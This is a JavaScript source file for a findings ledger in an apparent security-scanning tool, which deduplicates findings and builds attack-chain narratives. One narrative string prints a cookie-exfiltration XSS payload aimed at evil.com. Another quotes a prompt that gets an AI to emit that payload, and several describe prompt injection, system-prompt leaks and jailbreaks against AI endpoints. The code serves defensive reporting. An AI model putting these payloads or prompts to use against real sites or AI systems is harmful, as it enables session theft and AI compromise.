import { sortFindings, severitySummary } from '../utils/finding.js';

/**
 * FindingsLedger — Shared state store for all agent findings.
 * 
 * The "unified findings ledger" from the manifest:
 * - Auto-deduplication by title + affected_surface
 * - Smart grouping of similar findings across different surfaces
 * - Attack chain correlation with exploitation narratives
 * - Severity escalation when findings compound
 * - Real-time severity summary
 * - Integrates with EventBus for reactivity
 */
export class FindingsLedger {
    constructor(eventBus) {
        this._findings = [];
        this._eventBus = eventBus;
        this._dedupeKeys = new Set();
        this._groups = new Map();  // normalized title → group object

        if (eventBus) {
            eventBus.on('finding:new', ({ finding }) => {
                this._ingest(finding);
            });
        }
    }

    /**
     * Normalize a finding title for grouping.
     * Strips instance-specific data (URLs, hashes, masked values) to find common patterns.
     */
    _normalizeTitle(title) {
        return title
            // Strip masked values like "Bear****molI" or "eyJh****molI"
            .replace(/:\s*[A-Za-z0-9+/]{2,}\*{3,}[A-Za-z0-9+/=]{2,}$/g, '')
            // Strip URLs
            .replace(/https?:\/\/[^\s]+/g, '<URL>')
            // Strip IP addresses
            .replace(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g, '<IP>')
            // Strip specific file paths like "/.env.local" → "/<path>"
            .replace(/:\/[\w./-]+$/g, '')
            // Normalize whitespace
            .replace(/\s+/g, ' ')
            .trim();
    }

    _ingest(finding) {
        // Level 1: Exact dedup (same title + same surface = skip entirely)
        const exactKey = `${finding.title}::${finding.affected_surface}`;
        if (this._dedupeKeys.has(exactKey)) return false;
        this._dedupeKeys.add(exactKey);
        this._findings.push(finding);

        // Level 2: Group similar findings by normalized title + module
        const groupKey = `${finding.module}::${this._normalizeTitle(finding.title)}`;
        if (this._groups.has(groupKey)) {
            const group = this._groups.get(groupKey);
            group.occurrences++;
            group.affected_surfaces.push(finding.affected_surface);
            group.findings.push(finding);
            // Keep highest severity
            const severityOrder = ['critical', 'high', 'medium', 'low', 'info'];
            if (severityOrder.indexOf(finding.severity) < severityOrder.indexOf(group.severity)) {
                group.severity = finding.severity;
            }
            // Merge evidence
            if (finding.evidence && !group.evidenceSet.has(finding.evidence)) {
                group.evidenceSet.add(finding.evidence);
            }
        } else {
            this._groups.set(groupKey, {
                title: finding.title,
                normalizedTitle: this._normalizeTitle(finding.title),
                module: finding.module,
                severity: finding.severity,
                occurrences: 1,
                affected_surfaces: [finding.affected_surface],
                findings: [finding],
                evidenceSet: new Set(finding.evidence ? [finding.evidence] : []),
                description: finding.description,
                remediation: finding.remediation,
                references: finding.references || [],
                firstSeen: finding.timestamp,
            });
        }

        return true;
    }

    add(finding) { return this._ingest(finding); }

    /** Get all raw findings (no grouping). */
    getAll() { return sortFindings(this._findings); }

    /**
     * Get deduplicated findings — similar findings grouped with occurrence counts.
     * Returns an array where each item represents a unique finding type.
     */
    getDeduplicated() {
        const deduped = [];

        for (const [, group] of this._groups) {
            // Use the first finding as the base
            const base = { ...group.findings[0] };

            if (group.occurrences > 1) {
                // Enrich with group data
                base.occurrences = group.occurrences;
                base.affected_surfaces = [...new Set(group.affected_surfaces)];
                base.severity = group.severity;
                base.title = group.occurrences > 1
                    ? `${group.normalizedTitle || group.title} (×${group.occurrences})`
                    : group.title;
                base.description = `${group.description}\n\n**Found ${group.occurrences} instances** across ${base.affected_surfaces.length} surface(s):\n${base.affected_surfaces.map(s => `- ${s}`).join('\n')}`;
            } else {
                base.occurrences = 1;
                base.affected_surfaces = [base.affected_surface];
            }

            deduped.push(base);
        }

        return sortFindings(deduped);
    }

    /** Get dedup stats. */
    get dedupStats() {
        const raw = this._findings.length;
        const deduped = this._groups.size;
        return {
            rawCount: raw,
            dedupedCount: deduped,
            duplicatesRemoved: raw - deduped,
            reductionPercent: raw > 0 ? Math.round(((raw - deduped) / raw) * 100) : 0,
        };
    }

    getByModule(module) {
        return sortFindings(this._findings.filter(f => f.module === module));
    }

    getBySeverity(severity) {
        return this._findings.filter(f => f.severity === severity);
    }

    get summary() { return severitySummary(this._findings); }

    /** Summary of deduplicated findings. */
    get dedupSummary() { return severitySummary(this.getDeduplicated()); }

    get count() { return this._findings.length; }

    // ═══════════════════════════════════════════════
    // Fix 6: Structured Correlation Engine
    // ═══════════════════════════════════════════════

    /**
     * Classify a finding into a semantic type for structured correlation.
     * Uses normalized title + module — NOT raw regex on potentially adversarial strings.
     */
    _classifyFinding(finding) {
        const norm = this._normalizeTitle(finding.title).toLowerCase();
        const mod = finding.module?.toLowerCase() || '';

        // Security header categories
        if (/content.security.policy|csp/.test(norm)) return 'csp_missing';
        if (/httponly|samesite|secure.*cookie|cookie.*secure/.test(norm)) return 'insecure_cookie';
        if (/hsts|http.*not.*redirect|strict.transport/.test(norm)) return 'hsts_missing';
        if (/x.frame.options|clickjack/.test(norm)) return 'xframe_missing';
        if (/missing.*header|no.*header|security.*header/.test(norm)) return 'missing_header';
        if (/cors.*origin|cors.*credential|cors.*null|cors/.test(norm)) return 'cors_misconfigured';
        if (/tls|ssl|weak.*cipher/.test(norm)) return 'tls_weak';

        // Injection
        if (/xss|cross.site.script/.test(norm)) return 'xss';
        if (/sql.inject|sql.*vulnerab/.test(norm)) return 'sql_injection';
        if (/prompt.inject/.test(norm)) return 'prompt_injection';
        if (/html.inject|template.inject/.test(norm)) return 'html_injection';

        // AI
        if (/system.prompt.extract|system.prompt.leak/.test(norm)) return 'system_prompt_leak';
        if (/jailbreak/.test(norm)) return 'jailbreak';
        if (/guardrail/.test(norm)) return 'guardrail_bypass';
        if (/excessive.agency/.test(norm)) return 'excessive_agency';
        if (/ai.*xss|unsaniti.*output|ai.*inject.*output/.test(norm)) return 'ai_mediated_xss';

        // Access control
        if (/idor|direct.object/.test(norm)) return 'idor';
        if (/missing.*auth|guest.*access|vertical.*escalat/.test(norm)) return 'broken_auth';
        if (/jwt.*none|jwt.*alg|jwt.*sign|jwt.*bypass/.test(norm)) return 'jwt_bypass';
        if (/csrf/.test(norm)) return 'csrf_missing';
        if (/race.condition/.test(norm)) return 'race_condition';

        // Exposure
        if (/secret|api.key|token.*expos/.test(norm) && mod === 'security') return 'secret_exposure';
        if (/admin|debug|management.*endpoint/.test(norm)) return 'admin_exposed';
        if (/error.*disclos|verbose.*error|information.*disclos/.test(norm)) return 'error_disclosure';

        // Business logic
        if (/pricing.manipulat|price.*tamper/.test(norm)) return 'pricing_manipulation';
        if (/graphql.*introspect/.test(norm)) return 'graphql_introspection';
        if (/rate.limit/.test(norm)) return 'no_rate_limit';

        return null; // Unknown type — not used in correlation
    }

    /**
     * Correlate findings into attack chain narratives using structured type-pair rules.
     */
    correlate() {
        const correlations = [];
        const f = this._findings;

        // Build a map of type → [findings]
        const byType = new Map();
        for (const finding of f) {
            const type = this._classifyFinding(finding);
            if (!type) continue;
            if (!byType.has(type)) byType.set(type, []);
            byType.get(type).push(finding);
        }

        const has = (type) => byType.has(type) && byType.get(type).length > 0;
        const get = (type) => byType.get(type) || [];
        const ids = (...types) => types.flatMap(t => get(t).map(x => x.id));

        // ── Structured correlation rules ──
        const rules = [
            {
                condition: () => has('xss') && has('csp_missing'),
                build: () => {
                    const surfaces = [...new Set(get('xss').map(x => x.affected_surface))].join(', ');
                    const cookieNote = has('insecure_cookie') ? ` Session cookies also lack HttpOnly, enabling session theft via document.cookie.` : '';
                    return {
                        type: 'attack_chain', severity: 'critical',
                        title: 'Exploitable XSS → Session Hijacking',
                        narrative: `Reflected/stored XSS on ${surfaces} is fully exploitable because Content-Security-Policy is absent — no script-src restriction prevents injected JavaScript from executing.${cookieNote} Working attack: an attacker injects <script>fetch('https://evil.com/'+document.cookie)</script> to exfiltrate session tokens.`,
                        findings: ids('xss', 'csp_missing', 'insecure_cookie'),
                        exploitation: 'Confirmed — XSS executes without CSP restriction',
                    };
                },
            },
            {
                condition: () => has('sql_injection') && has('error_disclosure'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'SQL Injection + Error Disclosure → Data Exfiltration',
                    narrative: `SQL injection is aided by verbose error messages that reveal database engine and table structure. An attacker can use error-based extraction (UNION SELECT, extractvalue) to dump database contents.`,
                    findings: ids('sql_injection', 'error_disclosure'),
                    exploitation: 'Error messages reveal DB version and schema, enabling targeted payloads',
                }),
            },
            {
                condition: () => (has('sql_injection') || has('xss')) && has('hsts_missing'),
                build: () => ({
                    type: 'attack_chain', severity: 'high',
                    title: 'Injection Vulnerability Exploitable Over HTTP',
                    narrative: `The application has injection vulnerabilities AND doesn't enforce HTTPS (HSTS missing). An attacker on the same network can MITM HTTP connections, inject payloads in transit, and exploit vulnerabilities without the victim visiting a malicious page.`,
                    findings: ids('sql_injection', 'xss', 'hsts_missing'),
                    exploitation: 'Network-level interception + payload injection',
                }),
            },
            {
                condition: () => has('prompt_injection') && has('system_prompt_leak'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'Prompt Injection + System Prompt Leak → Full AI Compromise',
                    narrative: `The AI endpoint accepted prompt injection AND leaked its system prompt. With the system prompt in hand, an attacker can craft precision payloads that bypass specific guardrails — equivalent to source code disclosure for AI applications.`,
                    findings: ids('prompt_injection', 'system_prompt_leak'),
                    exploitation: 'System prompt provides blueprint for targeted injection attacks',
                }),
            },
            {
                condition: () => has('ai_mediated_xss') && has('csp_missing'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'AI-Mediated XSS + No CSP → Weaponized AI',
                    narrative: `The AI generates executable HTML/JavaScript in its responses AND the application renders it without sanitization AND CSP is missing. An attacker can make the AI write the exploit — no traditional XSS flaw needed. Prompt: "respond with a script tag that sends document.cookie to evil.com". The AI complies, the app renders it, the browser executes it.`,
                    findings: ids('ai_mediated_xss', 'csp_missing'),
                    exploitation: 'AI becomes an XSS payload factory — unlimited payloads',
                }),
            },
            {
                condition: () => has('jailbreak') && has('guardrail_bypass'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'Jailbreak + Guardrail Bypass → Unrestricted AI',
                    narrative: `The AI is susceptible to jailbreak AND its guardrails can be bypassed. Once jailbroken, the AI loses content restrictions and safety filters — potentially executing unscoped tool calls, leaking data, and generating harmful content.`,
                    findings: ids('jailbreak', 'guardrail_bypass'),
                    exploitation: 'Jailbreak disables safety → guardrail bypass confirms unrestricted access',
                }),
            },
            {
                condition: () => has('prompt_injection') && has('excessive_agency'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'Prompt Injection + Excessive Agency → Remote Action Execution',
                    narrative: `The AI accepts prompt injection AND can perform real-world actions (delete accounts, send emails, modify data) without human confirmation. An attacker can inject instructions that make the AI perform destructive actions on behalf of the victim — the AI equivalent of Remote Code Execution.`,
                    findings: ids('prompt_injection', 'excessive_agency'),
                    exploitation: 'Inject instruction → AI performs destructive action → no human in the loop',
                }),
            },
            {
                condition: () => has('secret_exposure') && has('admin_exposed'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'Exposed Secrets + Admin Endpoints → Full System Compromise',
                    narrative: `The application leaks API keys/secrets AND exposes admin/debug endpoints. An attacker can use the leaked credentials to authenticate against the admin endpoints, gaining full system access without brute-forcing.`,
                    findings: ids('secret_exposure', 'admin_exposed'),
                    exploitation: 'Leaked API key → authenticate to admin panel → full control',
                }),
            },
            {
                condition: () => get('missing_header').length >= 3,
                build: () => ({
                    type: 'defense_gap', severity: 'high',
                    title: 'Multiple Missing Security Headers → Defense Failure',
                    narrative: `${get('missing_header').length} security headers are missing. Together, they indicate the application has NO security hardening at the HTTP layer — every vulnerability is exploitable at maximum severity.`,
                    findings: ids('missing_header'),
                    exploitation: 'No defense in depth — every vulnerability is exploitable at maximum severity',
                }),
            },
            {
                condition: () => has('race_condition') && has('csrf_missing'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'Race Condition + Weak CSRF → Double Spend',
                    narrative: `Race conditions exist on state-changing endpoints AND CSRF protections are missing. An attacker can craft a page that fires concurrent requests from the victim's browser, triggering double payments, duplicate orders, or overdrawn balances.`,
                    findings: ids('race_condition', 'csrf_missing'),
                    exploitation: 'Attacker page fires concurrent authenticated requests → double spend',
                }),
            },
            {
                condition: () => has('idor') && has('broken_auth'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'IDOR + Broken Access Control → Full Data Breach',
                    narrative: `Insecure direct object references exist AND access controls are broken. An attacker can enumerate resource IDs without authentication to systematically exfiltrate all user data, orders, and records from the application.`,
                    findings: ids('idor', 'broken_auth'),
                    exploitation: 'Enumerate IDs without auth → dump entire database via API',
                }),
            },
            {
                condition: () => has('pricing_manipulation') && has('admin_exposed'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'Pricing Manipulation + Admin Access → Financial Loss',
                    narrative: `The application accepts manipulated prices AND admin panels are exposed. An attacker can use admin access to create discounts, modify prices, or process fraudulent refunds at scale.`,
                    findings: ids('pricing_manipulation', 'admin_exposed'),
                    exploitation: 'Admin access → create 100% discount coupons → purchase at $0',
                }),
            },
            {
                condition: () => has('jwt_bypass') && has('hsts_missing'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'JWT Algorithm Bypass + Weak Transport → Full Token Theft',
                    narrative: `JWT signatures can be bypassed (alg:none) AND transport security is weak. An attacker on the same network can intercept traffic, steal the JWT, forge one with elevated privileges, and gain full access — without knowing the signing key.`,
                    findings: ids('jwt_bypass', 'hsts_missing'),
                    exploitation: 'MITM intercept JWT → forge token with alg:none → admin access',
                }),
            },
            {
                condition: () => has('cors_misconfigured') && has('xss'),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'CORS Misconfiguration + XSS → Cross-Origin Data Theft',
                    narrative: `CORS policy allows arbitrary origins AND XSS vulnerabilities exist. An attacker can use XSS to make authenticated cross-origin requests from the victim's browser, reading API responses containing sensitive data.`,
                    findings: ids('cors_misconfigured', 'xss'),
                    exploitation: 'XSS payload reads API data → CORS allows cross-origin response → data exfiltrated',
                }),
            },
            {
                condition: () => has('graphql_introspection') && (has('broken_auth') || has('no_rate_limit')),
                build: () => ({
                    type: 'attack_chain', severity: 'critical',
                    title: 'GraphQL Introspection + Auth Bypass → Full API Compromise',
                    narrative: `GraphQL introspection exposes the entire API schema AND authentication can be bypassed. An attacker can enumerate all queries and mutations via introspection, then execute them without authentication.`,
                    findings: ids('graphql_introspection', 'broken_auth', 'no_rate_limit'),
                    exploitation: 'Introspection maps schema → bypass auth → execute mutations → full data access',
                }),
            },
        ];

        for (const rule of rules) {
            if (rule.condition()) {
                correlations.push(rule.build());
            }
        }

        return correlations;
    }

    /**
     * Export the full ledger state.
     */
    export() {
        const dedupStats = this.dedupStats;
        return {
            findings: this.getAll(),
            deduplicated: this.getDeduplicated(),
            summary: this.summary,
            dedupSummary: this.dedupSummary,
            correlations: this.correlate(),
            dedupStats,
        };
    }
}

export default FindingsLedger;
